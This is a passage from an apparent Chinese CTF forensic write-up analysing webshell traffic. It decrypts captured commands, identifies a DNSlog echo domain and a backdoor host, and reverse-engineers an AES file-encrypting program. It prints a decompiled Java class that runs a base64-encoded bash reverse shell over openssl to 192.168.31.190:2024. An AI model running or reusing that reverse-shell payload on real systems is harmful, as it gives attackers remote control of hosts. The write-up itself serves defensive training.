+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">static</span> <span class="n">String</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">strToEncrypt</span><span class="p">)</span> <span class="n">throws</span> <span class="ne">Exception</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">SecretKeySpec</span> <span class="n">secretKey</span> <span class="o">=</span> <span class="n">new</span> <span class="n">SecretKeySpec</span><span class="p">(</span><span class="n">KEY</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(),</span> <span class="n">ALGORITHM</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="n">getInstance</span><span class="p">(</span><span class="n">ALGORITHM</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="n">Cipher</span><span class="o">.</span><span class="n">ENCRYPT_MODE</span><span class="p">,</span> <span class="n">secretKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">byte</span><span class="p">[]</span> <span class="n">encryptedByteValue</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">doFinal</span><span class="p">(</span><span class="n">strToEncrypt</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Base64</span><span class="o">.</span><span class="n">getEncoder</span><span class="p">()</span><span class="o">.</span><span class="n">encodeToString</span><span class="p">(</span><span class="n">encryptedByteValue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">String</span> <span class="n">strToDecrypt</span><span class="p">)</span> <span class="n">throws</span> <span class="ne">Exception</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">SecretKeySpec</span> <span class="n">secretKey</span> <span class="o">=</span> <span class="n">new</span> <span class="n">SecretKeySpec</span><span class="p">(</span><span class="n">KEY</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(),</span> <span class="n">ALGORITHM</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="n">getInstance</span><span class="p">(</span><span class="n">ALGORITHM</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="n">Cipher</span><span class="o">.</span><span class="n">DECRYPT_MODE</span><span class="p">,</span> <span class="n">secretKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">byte</span><span class="p">[]</span> <span class="n">decodedValue</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="n">getDecoder</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">strToDecrypt</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">byte</span><span class="p">[]</span> <span class="n">decryptedByteValue</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">doFinal</span><span class="p">(</span><span class="n">decodedValue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">decryptedByteValue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">b</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">var0</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">int</span> <span class="n">var10000</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayInputStream</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">var0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">int</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">var10000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">GZIPInputStream</span> <span class="n">var4</span> <span class="o">=</span> <span class="n">new</span> <span class="n">GZIPInputStream</span><span class="p">(</span><span class="n">var3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">byte</span><span class="p">[]</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">var8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="n">true</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">int</span> <span class="n">var6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">((</span><span class="n">var6</span> <span class="o">=</span> <span class="n">var4</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">var5</span><span class="p">))</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">var8</span> <span class="o">=</span> <span class="n">var2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">var1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="n">var2</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">var5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">var6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">var1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">var8</span> <span class="o">=</span> <span class="n">var2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">var8</span><span class="o">.</span><span class="n">toByteArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">gzipEncode</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="nb">input</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">GZIPOutputStream</span> <span class="n">gzipOs</span> <span class="o">=</span> <span class="n">new</span> <span class="n">GZIPOutputStream</span><span class="p">(</span><span class="n">baos</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gzipOs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gzipOs</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">baos</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">baos</span><span class="o">.</span><span class="n">toByteArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>将这段密文解密</p>
+<p><img loading="lazy" src="images/image-20241211150513-grwu2r4.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211150513-grwu2r4.png, images/image-20241211150513-grwu2r4.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211150513-grwu2r4.png 2x" sizes="auto" data-title="image" data-alt="image" width="3840" height="1986" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>得到执行的命令whoami</p>
+<p><img loading="lazy" src="images/image-20241211150454-u3e1x0p.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211150454-u3e1x0p.png, images/image-20241211150454-u3e1x0p.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211150454-u3e1x0p.png 2x" sizes="auto" data-title="image" data-alt="image" width="2190" height="924" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>‍</p>
+<p>flag{whoami}</p>
+<h2 id="5这个webshell是根据什么进行回显的提交ip或域名">5、这个webshell是根据什么进行回显的？（提交ip或域名）</h2>
+<p>从上题可知dnslog域名为</p>
+<p><img loading="lazy" src="images/image-20241210205704-exy1pnt.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210205704-exy1pnt.png, images/image-20241210205704-exy1pnt.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210205704-exy1pnt.png 2x" sizes="auto" data-title="image" data-alt="image" width="3240" height="886" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">flag</span><span class="p">{</span><span class="n">d5454c8975</span><span class="o">.</span><span class="n">ipv6</span><span class="mf">.1433</span><span class="o">.</span><span class="n">eu</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="6黑客留下后门的反连的ip和port是什么flagipport">6、黑客留下后门的反连的IP和PORT是什么？（flag{IP|PORT})</h2>
+<p>解密最后一段密文</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Source</span> <span class="n">code</span> <span class="n">recreated</span> <span class="kn">from</span> <span class="nn">a</span> <span class="o">.</span><span class="k">class</span> <span class="nc">file</span> <span class="n">by</span> <span class="n">IntelliJ</span> <span class="n">IDEA</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="p">(</span><span class="n">powered</span> <span class="n">by</span> <span class="n">FernFlower</span> <span class="n">decompiler</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">class</span> <span class="nc">shell</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">shell</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">static</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">,</span> <span class="s2">&#34;echo bWtmaWZvIC90bXAvcmV2c2hlbGw7IC9iaW4vYmFzaCAtaSA8IC90bXAvcmV2c2hlbGwgMj4mMSB8IG9wZW5zc2wgc19jbGllbnQgLXF1aWV0IC1jb25uZWN0IDE5Mi4xNjguMzEuMTkwOjIwMjQgLWtleWxvZ2ZpbGUga2V5LmxvZyA+IC90bXAvcmV2c2hlbGw7IHJtIC1mIC90bXAvcmV2c2hlbGw=|base64 -d|bash&#34;</span><span class="p">});</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">IOException</span> <span class="n">var1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">var1</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现是反弹shell 到192.168.31.190的2024端口</p>
+<p><img loading="lazy" src="images/image-20241211150700-teod06m.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211150700-teod06m.png, images/image-20241211150700-teod06m.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211150700-teod06m.png 2x" sizes="auto" data-title="image" data-alt="image" width="3054" height="666" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>flag{192.168.31.190|2024}</p>
+<h2 id="7黑客通过后门反连执行的第一条命令是什么">7、黑客通过后门反连执行的第一条命令是什么？</h2>
+<p>tcp.port==2024过滤数据包，但是通信都是密文，这里是tls加密过的</p>
+<p><img loading="lazy" src="images/image-20241211150812-l49zqv1.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211150812-l49zqv1.png, images/image-20241211150812-l49zqv1.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211150812-l49zqv1.png 2x" sizes="auto" data-title="image" data-alt="image" width="3840" height="1986" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>从反弹shell命令中发现有个key.log的日志文件供解密，从/opt/apache-tomcat-8.5.19/bin目录下发现key.log文件</p>
+<p><img loading="lazy" src="images/image-20241210154758-o4eglig.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210154758-o4eglig.png, images/image-20241210154758-o4eglig.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210154758-o4eglig.png 2x" sizes="auto" data-title="image" data-alt="image" width="1750" height="202" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>配置ssl解密</p>
+<p><img loading="lazy" src="images/image-20241208185224-9pxwtpt.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241208185224-9pxwtpt.png, images/image-20241208185224-9pxwtpt.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241208185224-9pxwtpt.png 2x" sizes="auto" data-title="image" data-alt="image" width="1548" height="1164" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>追踪流得到第一条命令ls</p>
+<p><img loading="lazy" src="images/image-20241210210245-vvj3y2w.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210210245-vvj3y2w.png, images/image-20241210210245-vvj3y2w.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210210245-vvj3y2w.png 2x" sizes="auto" data-title="image" data-alt="image" width="3840" height="1986" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">flag</span><span class="p">{</span><span class="n">ls</span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="8请上机排查黑客新增的后门程序会连接到哪台恶意主机提交主机ipport如flag1270011234">8、请上机排查黑客新增的后门程序会连接到哪台恶意主机？（提交主机IP|port）如(flag{127.0.0.1|1234})</h2>
+<p>排查进程得到update程序</p>
+<p><img loading="lazy" src="images/image-20241211143541-bbd69gj.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211143541-bbd69gj.png, images/image-20241211143541-bbd69gj.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211143541-bbd69gj.png 2x" sizes="auto" data-title="image" data-alt="image" width="1052" height="122" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cp</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="mi">32479</span><span class="o">/</span><span class="n">exe</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">update</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传沙箱得到恶意IP和PORT</p>
+<p><img loading="lazy" src="images/image-20241210143945-lsu6y0r.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210143945-lsu6y0r.png, images/image-20241210143945-lsu6y0r.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210143945-lsu6y0r.png 2x" sizes="auto" data-title="image" data-alt="image" width="2740" height="1250" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>flag{10.10.13.37|4444}</p>
+<h2 id="9黑客加密了root目录下的一个重要文件请你将解密后的文件内容作为flag提交">9、黑客加密了/root目录下的一个重要文件，请你将解密后的文件内容作为flag提交</h2>
+<p>在/root目录下发现flagen.txt密文</p>
+<p>进程中发现有加密程序</p>
+<p><img loading="lazy" src="images/image-20241211140849-twltenx.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211140849-twltenx.png, images/image-20241211140849-twltenx.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211140849-twltenx.png 2x" sizes="auto" data-title="image" data-alt="image" width="1322" height="126" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>但是加密程序已经被删除，但是可以从proc中提取</p>
+<div class="highlight" id="id-7"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cp</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="mi">29908</span><span class="o">/</span><span class="n">exe</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">lock</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>逆向分析程序，发现打开了 两个文件，读取和写入</p>
+<p><img loading="lazy" src="images/image-20241211141212-jgmq713.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211141212-jgmq713.png, images/image-20241211141212-jgmq713.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211141212-jgmq713.png 2x" sizes="auto" data-title="image" data-alt="image" width="1232" height="288" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>最后读取的内容给aes加密类型是cbc</p>
+<p><img loading="lazy" src="images/image-20241211141325-a6c56x3.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211141325-a6c56x3.png, images/image-20241211141325-a6c56x3.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211141325-a6c56x3.png 2x" sizes="auto" data-title="image" data-alt="image" width="1262" height="152" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>v19就是AES的key，很简单就是从0x41开始每次+1作为key</p>
+<p><img loading="lazy" src="images/image-20241211141441-4doaaue.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211141441-4doaaue.png, images/image-20241211141441-4doaaue.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211141441-4doaaue.png 2x" sizes="auto" data-title="image" data-alt="image" width="1394" height="550" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>最后密文写到v5也就是flagen.txt</p>
+<p>解密脚本</p>
+<div class="highlight" id="id-8"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
